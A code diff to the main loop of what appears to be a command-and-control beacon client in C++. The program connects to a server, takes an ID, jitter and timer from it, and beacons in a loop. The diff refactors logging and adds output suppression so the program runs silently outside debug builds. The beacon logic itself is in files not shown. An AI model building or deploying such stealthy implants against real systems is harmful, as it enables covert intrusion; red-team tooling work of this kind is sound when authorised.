@@ -6,6 +6,7 @@
 
 #include "Generic/config.hpp"
 #include "Generic/logging.hpp"
+
 #include "Generic/beacon/httpRequests.hpp"
 
 #ifdef __unix__
@@ -17,7 +18,12 @@
 #endif
 
 int main() {
-    logger("Program Starting");
+    // Suppress stdout and stderr when DEBUG is not set
+    #ifndef DEBUG
+    surpressOutput();
+    #endif
+
+    logger.warn("Program Starting");
     // Session::initSSL();
     // {
     //     std::cout << "[DEBUG] SSL initialized. Starting session." << std::endl;
@@ -56,26 +62,26 @@ int main() {
     while (true) {
         try {
             if (ID != "" && JITTER != -1 && TIMER != -1) {
-                logger("HTTP Reconnect");
+                logger.log("HTTP Reconnect");
                 auto result = httpReconnect(URL, ID, JITTER, TIMER);
                 if (std::get<0>(result) == -1) {
                     continue;
                 }
             } else {
-                logger("HTTP Connect");
+                logger.log("HTTP Connect");
                 auto result = httpConnection(URL);
                 if (std::get<0>(result) == -1) {
                     continue;
                 }
                 TIMER = std::get<0>(result);
-                logger("Timer set to " + std::to_string(TIMER));
+                logger.log("Timer set to " + std::to_string(TIMER));
                 ID = std::get<1>(result);
-                logger("ID set to " + ID);
+                logger.log("ID set to " + ID);
                 JITTER = std::get<2>(result);
-                logger("Jitter Set to " + std::to_string(JITTER));
+                logger.log("Jitter Set to " + std::to_string(JITTER));
 
             }
-            logger("Beaconing");
+            logger.log("Beaconing");
             int err = beacon();
             if (err == -1) {
                 continue;
@@ -83,7 +89,7 @@ int main() {
 
 
         } catch (const std::exception& e) {
-            log_error(std::string("Failed to establish HTTP connection: ") + e.what());
+            logger.error(std::string("Failed to establish HTTP connection: ") + e.what());
             return 1;
         }
     }
